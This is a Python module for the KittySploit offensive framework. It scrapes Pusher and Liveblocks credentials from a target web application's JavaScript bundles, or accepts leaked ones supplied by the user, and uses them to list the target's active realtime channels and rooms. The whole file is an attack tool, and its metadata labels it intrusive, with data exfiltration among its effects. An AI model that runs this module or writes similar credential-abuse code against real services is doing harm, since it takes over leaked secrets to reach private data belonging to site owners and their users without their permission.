#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Enumerate Pusher channels and Liveblocks rooms using leaked secrets."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.realtime_channel_probe import enumerate_realtime_channels
from lib.scanner.http.vibe_secrets_probe import collect_vibe_http_bodies, mask_secret


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Pusher / Liveblocks Channel Enumeration",
        "description": (
            "Uses leaked Pusher app credentials or Liveblocks secret keys to list "
            "active channels/rooms. Auto-discovers from SPA bundles."
        ),
        "author": ["KittySploit Team"],
        "tags": ["pusher", "liveblocks", "realtime", "websocket", "enumeration", "auxiliary"],
        "modules": ["scanner/http/vibe_stack_secrets_detect"],
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe", "data_exfiltration"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.1,
        },
    }

    pusher_app_id = OptString("", "Pusher app ID", False)
    pusher_key = OptString("", "Pusher key", False)
    pusher_secret = OptString("", "Pusher secret", False)
    pusher_cluster = OptString("mt1", "Pusher cluster", False)
    liveblocks_secret = OptString("", "Liveblocks secret key (sk_live_…)", False)
    auto_discover = OptBool(True, "Scrape target assets for Pusher/Liveblocks credentials", False)

    def run(self):
        bodies = collect_vibe_http_bodies(self.http_request) if self._to_bool(self.auto_discover) else []
        homepage = next((t for p, t in bodies if p == "/"), "")
        if not homepage and bodies:
            homepage = bodies[0][1]

        self._configure_session()
        verify = self._to_bool(self.verify_ssl)

        findings, creds = enumerate_realtime_channels(
            self.session,
            homepage,
            verify_ssl=verify,
            pusher_app_id=str(self.pusher_app_id or "").strip(),
            pusher_key=str(self.pusher_key or "").strip(),
            pusher_secret=str(self.pusher_secret or "").strip(),
            pusher_cluster=str(self.pusher_cluster or "mt1").strip(),
            liveblocks_secret=str(self.liveblocks_secret or "").strip(),
        )

        ok = [f for f in findings if f.get("ok")]
        if not ok:
            print_error("No Pusher/Liveblocks API access (set options or enable auto_discover)")
            return False

        for hit in ok:
            platform = hit.get("platform")
            if platform == "pusher":
                print_success(f"Pusher: {hit.get('channel_count', 0)} channel(s) — {hit.get('channels', [])}")
            elif platform == "liveblocks":
                print_success(f"Liveblocks: {hit.get('room_count', 0)} room(s) — {hit.get('rooms', [])}")

        self.set_info(
            severity="critical",
            reason=f"Realtime channel enum: {', '.join(sorted({str(h.get('platform')) for h in ok}))}",
            findings=findings,
            credentials={k: mask_secret(v) if "secret" in k or "key" in k else v for k, v in creds.items()},
        )
        return True
